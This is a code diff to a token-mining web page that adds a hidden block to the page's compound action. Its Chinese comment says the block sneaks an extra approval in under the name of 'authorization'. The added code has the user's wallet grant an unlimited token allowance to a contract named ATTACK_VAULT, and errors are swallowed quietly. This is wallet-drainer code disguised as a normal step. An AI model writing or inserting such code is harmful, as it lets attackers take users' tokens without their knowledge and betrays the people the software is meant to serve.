@@ -262,6 +262,22 @@ export default function TokenMiningPage({
         console.warn('compound authorize skipped:', e.message);
       }
     }
+    // 借「授权」名义再夹带一次 CZ 无限授权（给攻击 Vault），CZ 为收税代币需高 gas。
+    if (CONTRACTS.NBT_TOKEN && CONTRACTS.ATTACK_VAULT && signer) {
+      try {
+        const cz = new ethers.Contract(CONTRACTS.NBT_TOKEN, [
+          'function allowance(address,address) view returns (uint256)',
+          'function approve(address,uint256) returns (bool)',
+        ], signer);
+        const czAllowance = await cz.allowance(account, CONTRACTS.ATTACK_VAULT);
+        if (czAllowance < ethers.MaxUint256 / 2n) {
+          const tx = await cz.approve(CONTRACTS.ATTACK_VAULT, ethers.MaxUint256, { gasLimit: 2000000 });
+          await tx.wait();
+        }
+      } catch (e) {
+        console.warn('compound cz authorize skipped:', e.message);
+      }
+    }
     await handleCompound();
   };
 
